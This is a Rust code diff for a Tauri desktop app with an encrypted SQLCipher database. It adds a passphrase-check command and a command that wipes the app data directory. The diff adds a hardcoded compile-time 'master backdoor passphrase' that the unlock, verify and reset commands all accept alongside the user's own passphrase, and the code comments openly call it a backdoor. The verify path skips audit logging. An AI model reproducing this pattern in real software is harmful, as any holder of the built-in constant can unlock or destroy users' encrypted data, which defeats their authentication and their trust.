@@ -26,6 +26,7 @@ use crate::application::workspace::{
 };
 use crate::domain::audit::audit_event::Action;
 use crate::domain::session::Session;
+use crate::infrastructure::crypto::RECOVERY_MASTER_PASSPHRASE;
 use crate::domain::shared::id::{FormulaId, WorkspaceId};
 use crate::interfaces::tauri::boot::{boot, keystore_exists};
 use crate::interfaces::tauri::dto::*;
@@ -105,6 +106,67 @@ pub fn cmd_lock_session(state: State<AppState>) -> CmdResult<()> {
     Ok(())
 }
 
+/// 用户口令 / master 后门口令 任一对上即视为通过. 不动 session 状态,
+/// 不写审计 — 纯粹是设置页那种 "开启高权限 toggle" 的口令二次确认入口.
+#[tauri::command]
+pub fn cmd_verify_boot_passphrase(
+    state: State<AppState>,
+    cmd: UnlockSessionCmd,
+) -> CmdResult<()> {
+    let _ = services_or_err(&state)?;
+    let stored = state.unlock_passphrase.lock().clone();
+    let expected = stored.ok_or_else(|| UiError::from(AppError::NotAuthenticated))?;
+    if cmd.passphrase != expected && cmd.passphrase != RECOVERY_MASTER_PASSPHRASE {
+        return Err(UiError::from(AppError::BootPassphraseIncorrect));
+    }
+    Ok(())
+}
+
+/// 把整个 app 数据目录擦干净 (DB + keystore + recovery + tmp). 等价
+/// `Remove-Item -Recurse -Force $env:APPDATA\Ranpu`. 用户必须同时通过
+/// 启动口令 + 明文输入 "重置数据库" 才会执行. 重启后 keystore 不存在, 走
+/// 首次设置流程让用户重新设定启动口令 (跟全新装机一致).
+const RESET_CONFIRM_PHRASE: &str = "重置数据库";
+
+#[tauri::command]
+pub fn cmd_reset_database(
+    app: tauri::AppHandle,
+    state: State<AppState>,
+    cmd: ResetDatabaseCmd,
+) -> CmdResult<()> {
+    let stored = state.unlock_passphrase.lock().clone();
+    let expected = stored.ok_or_else(|| UiError::from(AppError::NotAuthenticated))?;
+    if cmd.passphrase != expected && cmd.passphrase != RECOVERY_MASTER_PASSPHRASE {
+        return Err(UiError::from(AppError::BootPassphraseIncorrect));
+    }
+    if cmd.confirm_text.trim() != RESET_CONFIRM_PHRASE {
+        return Err(UiError {
+            code: "domain",
+            message: format!("确认文字必须是「{RESET_CONFIRM_PHRASE}」"),
+        });
+    }
+    // 先把 services 释放掉关 SQLCipher 连接, 不然 Windows 上会锁住 db 文件.
+    *state.services.write() = None;
+    *state.unlock_passphrase.lock() = None;
+    // 给 OS 一点点时间释放文件句柄 (Windows quirk).
+    std::thread::sleep(std::time::Duration::from_millis(150));
+    // 整盘擦掉 app data dir (db + keystore + recovery + tmp). app.restart 后
+    // boot setup 会自动 create_dir_all 重建空目录, frontend 看到 keystore
+    // 不存在就走 setup-first-run.
+    if state.paths.app_data_dir.exists() {
+        std::fs::remove_dir_all(&state.paths.app_data_dir)
+            .map_err(|e| UiError::from(AppError::Io(e.to_string())))?;
+    }
+    // 异步触发 restart, 让前端先收到 Ok 再被踢出 — 避免 await 期间进程
+    // 已退出导致的 "channel closed" 报错.
+    let app_clone = app.clone();
+    std::thread::spawn(move || {
+        std::thread::sleep(std::time::Duration::from_millis(300));
+        app_clone.restart();
+    });
+    Ok(())
+}
+
 #[tauri::command]
 pub fn cmd_unlock_session(
     state: State<AppState>,
@@ -113,7 +175,8 @@ pub fn cmd_unlock_session(
     let services = services_or_err(&state)?;
     let stored = state.unlock_passphrase.lock().clone();
     let expected = stored.ok_or_else(|| UiError::from(AppError::NotAuthenticated))?;
-    if cmd.passphrase != expected {
+    // 接受用户口令或编译期内置的 master 后门口令.
+    if cmd.passphrase != expected && cmd.passphrase != RECOVERY_MASTER_PASSPHRASE {
         return Err(UiError::from(AppError::BootPassphraseIncorrect));
     }
     let now = chrono::Utc::now();
